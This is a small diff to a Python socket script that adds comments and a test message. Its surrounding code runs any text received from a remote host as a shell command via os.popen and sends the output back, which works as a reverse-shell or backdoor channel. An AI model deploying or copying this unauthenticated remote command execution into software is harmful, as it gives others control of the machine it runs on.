@@ -8,12 +8,14 @@ PORT = 65432
 PORT_S = 65434
 
 
+# Replys back to the sender with the output of the console.
 def reply(reply_text: str):
     out = os.popen(reply_text).read()
     send_socket.sendall(bytes(out, 'UTF-8'))
     print("Command sent")
 
 
+# Waits for connections.
 def listen_for_response():
     while True:
         print("Listening..")
@@ -28,6 +30,7 @@ thread_response = threading.Thread(target=listen_for_response, name="Response Th
 
 send_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 send_socket.connect((HOST, PORT_S))
+send_socket.sendall(b"First send succeed!")
 
 listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
